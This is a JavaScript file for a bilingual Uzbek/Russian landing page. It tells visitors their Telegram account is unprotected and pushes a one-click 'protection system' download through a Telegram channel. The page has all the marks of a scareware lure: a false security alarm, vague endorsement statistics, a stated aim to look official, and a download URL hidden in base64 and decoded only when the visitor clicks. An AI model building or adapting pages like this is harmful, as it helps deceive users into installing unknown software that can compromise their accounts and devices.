
(function(){'use strict';
  const i18n = {
    "uz": {
      "title": "Sizning Telegram akkauntingiz himoyasiz!",
      "subtitle": "Himoya tizimini o‘rnating va akkauntingizni xavfsiz holatga keltiring.",
      "b1": "Noqonuniy kirishlarni aniqlash",
      "b2": "Bildirishnomalar va tavsiyalar",
      "b3": "1 bosishda o‘rnatish",
      "stat1": "so‘nggi 24 soat ichida",
      "stat2": "foydalanuvchi tavsiya qiladi",
      "cta": "O‘rnatish",
      "note": "Yuklab olish Telegram kanali orqali amalga oshiriladi",
      "risk": "Himoya darajasi",
      "f1t": "Tez va oson",
      "f1d": "Ilovani o‘rnating, tugmani bosing — himoya yoqiladi.",
      "f2t": "Qulay xabarnomalar",
      "f2d": "Shubhali faollik bo‘lsa, darhol ogohlantiramiz.",
      "f3t": "Rasmiy ko‘rinish",
      "f3d": "Toza dizayn, hech qanday ortiqcha narsalarsiz.",
      "disclaimer": "Disclaimer: Ushbu sayt Telegram bilan bog‘liq emas. Bu sahifa akkaunt xavfsizligi haqida ma’lumot beradi."
    },
    "ru": {
      "title": "Ваш Telegram-аккаунт не защищён!",
      "subtitle": "Установите систему защиты и обеспечьте безопасность вашего аккаунта.",
      "b1": "Выявление подозрительных входов",
      "b2": "Уведомления и рекомендации",
      "b3": "Установка в один клик",
      "stat1": "за последние 24 часа",
      "stat2": "пользователей рекомендуют",
      "cta": "Установить",
      "note": "Загрузка выполняется через Telegram‑канал",
      "risk": "Уровень защиты",
      "f1t": "Быстро и просто",
      "f1d": "Установите приложение и нажмите кнопку — защита включится.",
      "f2t": "Удобные уведомления",
      "f2d": "Если обнаружим подозрительную активность — предупредим.",
      "f3t": "Официальный вид",
      "f3d": "Чистый дизайн, без лишнего.",
      "disclaimer": "Дисклеймер: Этот сайт не связан с Telegram. Страница носит информационный характер о безопасности аккаунта."
    }
  };

  const els = {
    cta: document.getElementById('cta'),
    sticky: document.getElementById('sticky-cta'),
    langUZ: document.getElementById('lang-uz'),
    langRU: document.getElementById('lang-ru')
  };

  function applyLang(code){
    const dict = i18n[code] || i18n.uz;
    document.documentElement.lang = code;
    document.querySelectorAll('[data-i18n]').forEach(node=>{
      const key = node.getAttribute('data-i18n');
      if(dict[key]) node.textContent = dict[key];
    });
    localStorage.setItem('tp_lang', code);
    els.langUZ.classList.toggle('active', code==='uz');
    els.langRU.classList.toggle('active', code==='ru');
  }
  const saved = (function(){
    const s = localStorage.getItem('tp_lang');
    if(s) return s;
    const nav = (navigator.language||'uz').toLowerCase();
    return nav.startsWith('ru') ? 'ru' : 'uz';
  })();
  applyLang(saved);

  els.langUZ.addEventListener('click', ()=>applyLang('uz'));
  els.langRU.addEventListener('click', ()=>applyLang('ru'));

  function go(){
    try {
      const url = atob(window.TELEGRAM_URL_B64 || "");
      const open = () => (window.location.href = url);
      setTimeout(open, 120);
    } catch(e) {
      console.error(e);
    }
  }
  els.cta.addEventListener('click', go);
  els.sticky.addEventListener('click', go);
})();
